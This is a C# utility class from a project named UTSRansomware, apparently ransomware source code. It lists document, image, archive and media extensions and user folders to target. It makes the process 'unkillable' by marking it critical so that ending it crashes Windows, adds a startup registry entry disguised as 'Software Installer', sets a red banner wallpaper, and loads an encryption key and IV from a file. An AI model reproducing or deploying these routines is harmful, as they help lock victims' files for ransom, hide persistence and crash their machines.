﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace UTSRansomware
{
    public static class Utils
    {

        // Common file extensions
        public static string[] fileExtensions = {
        ".doc", ".docx", // Microsoft Word
        ".xls", ".xlsx", // Microsoft Excel
        ".ppt", ".pptx", // Microsoft PowerPoint
        ".pdf",          // Adobe PDF
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", // Images
        ".txt", ".rtf",  // Text File
        ".zip", ".7z", ".rar", // Archives
        ".mp3", ".mp4", ".avi", ".mkv", // Video + Audio    
        };

        // Allows marking process as critical to Windows OS
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        // Allows setting of desktop background
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private  const int SPIF_UPDATEINIFILE = 0x1;
        private const int SPIF_SENDCHANGE = 0x2;

        // Array of SpecialFolders
        public static Environment.SpecialFolder[] specialFolders = {
        Environment.SpecialFolder.MyDocuments,
        Environment.SpecialFolder.MyPictures,
        Environment.SpecialFolder.MyVideos,
        Environment.SpecialFolder.MyMusic,
        Environment.SpecialFolder.Desktop,
    };

        // Function that will cause BSOD if process terminated
        public static void MakeProcessUnkillable()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        // Makes program launch on startup
        public static void AddToStartup()
        {
            string appName = "Software Installer";

            // Get the path of the main exe
            string appPath = Process.GetCurrentProcess().MainModule.FileName;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Add value to registry
            startupKey.SetValue(appName, $"\"{appPath}\"");
        }

        // Sets desktop background to red banner
        public static void SetDesktopBackground()
        {
            // Get working directory
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;

            // Append file name
            string fullPath = Path.Combine(appDirectory, "DesktopBG.jpg");

            // Call SystemParametersInfo function to set the desktop wallpaper
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fullPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        // Gets key and iv from file
        public static string[] GetKeyAndIV()
        {
            return File.ReadAllLines("keyiv");
        }
    }
}
